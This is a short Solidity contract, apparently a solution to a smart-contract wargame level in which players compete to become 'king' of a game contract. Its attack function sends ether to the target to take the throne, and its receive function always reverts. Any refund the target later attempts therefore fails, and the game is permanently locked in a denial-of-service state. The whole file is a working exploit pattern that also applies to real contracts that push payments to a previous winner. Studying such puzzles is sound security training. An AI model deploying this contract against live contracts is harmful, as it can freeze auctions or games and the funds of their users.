// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;


contract KingForever {

    function attack(address kingGame) external payable {
        (bool success, ) = payable(kingGame).call{value: msg.value}("");
        require(success, "External call failed");
    }

    receive() external payable {
        require(false, "may he reign forever");
    }



}

